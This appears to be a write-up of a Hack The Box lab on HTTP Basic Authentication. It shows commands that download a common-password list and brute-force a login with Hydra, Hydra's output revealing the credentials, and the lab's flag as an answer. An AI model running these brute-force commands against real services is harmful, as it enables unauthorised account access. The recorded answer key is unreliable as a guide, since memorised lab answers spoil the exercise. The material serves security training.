# Basic HTTP Authentication
In essence, Basic Auth is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. The process begins when a user attempts to access a restricted area. The server responds with a `401 Unauthorized` status and a `WWW-Authenticate` header prompting the user's browser to present a login dialog.

```sh
masterofblafu@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt
# Hydra command
masterofblafu@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81
```

Let's break down the command:

- `-l basic-auth-user`: This specifies that the username for the login attempt is 'basic-auth-user'.
- `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file '2023-200_most_used_passwords.txt' for its brute-force attack.
- `127.0.0.1`: This is the target IP address, in this case, the local machine (localhost).
- `http-get /`: This tells Hydra that the target service is an HTTP server and the attack should be performed using HTTP GET requests to the root path ('/').
- `-s 81`: This overrides the default port for the HTTP service and sets it to 81.

## Questions
1. After successfully brute-forcing, and then logging into the target, what is the full flag you find? **Answer: HTB{th1s_1s_4_f4k3_fl4g}**
   - Run hydra using the `http-get` module → obtain valid credentials `basic-auth-user`:`Password@123`
        ```sh
        $ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 154.57.164.76 -s 31973 http-get /
        Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-13 05:45:45
        [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
        [DATA] attacking http-get://154.57.164.76:31973/
        [31973][http-get] host: 154.57.164.76   login: basic-auth-user   password: Password@123
        1 of 1 target successfully completed, 1 valid password found
        ```
   - Visit browser at http://154.57.164.76:31973, enter the credentials and obtain the flag